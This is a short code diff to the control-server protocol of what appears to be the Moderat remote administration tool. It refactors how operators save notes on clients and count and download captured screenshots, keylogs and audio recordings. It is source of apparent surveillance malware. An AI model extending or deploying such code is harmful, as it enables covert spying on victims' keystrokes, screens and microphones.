@@ -130,7 +130,7 @@ class ModeratServerProtocol(LineReceiver):
                 if len(note_data) == 2:
                     client_id, note_body = note_data
                     self.factory.database.setClientNote(client_id, note_body)
-                    self.factory.log.debug('[MODERATOR] Moderator ({}) Login Success'.format(moderator))
+                    self.factory.log.debug('[MODERATOR][{}] Note Saved For [{}] Login Success'.format(moderator, client_id))
                 else:
                     self.factory.log.critical('[MODERATOR][{}] Bad Note Data'.format(moderator))
 
@@ -158,30 +158,16 @@ class ModeratServerProtocol(LineReceiver):
                 screen_data = self.payload.split()
                 if len(screen_data) == 2:
                     identifier, date = screen_data
-                    counted_data = {
-                        'screenshots': {
-                            'new': self.factory.database.get_screenshots_count_0(identifier, date),
-                            'old': self.factory.database.get_screenshots_count_1(identifier, date)
-                        },
-                        'keylogs': {
-                            'new': self.factory.database.get_keylogs_count_0(client_id, date),
-                            'old': self.factory.database.get_keylogs_count_1(client_id, date)
-                        },
-                        'audio': {
-                            'new': self.factory.database.get_audios_count_0(client_id, date),
-                            'old': self.factory.database.get_audios_count_1(client_id, date)
-                        }
-                    }
-
-                    self.sendMessage(self, counted_data)
+                    self.sendMessage(self, self.factory.database.logsCount(identifier, date))
                 else:
-                    self.factory.log.warning('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, mode))
+                    self.factory.log.warning('[MALFORMED][{0}] [MODE: {1}]'.format(moderator.username, self.mode))
 
             elif self.mode == 'downloadLogs':
-                if type(self.payload) == dict:
+                if type(self.payload) is dict:
                     download_info = self.payload
                     # Get All Logs
                     if download_info['screenshot']:
+
                         screenshots = self.factory.database.get_all_new_screenshots(download_info['client_id'],
                                                                                 download_info['date']) \
                             if download_info['filter'] else self.factory.database.get_all_screenshots(
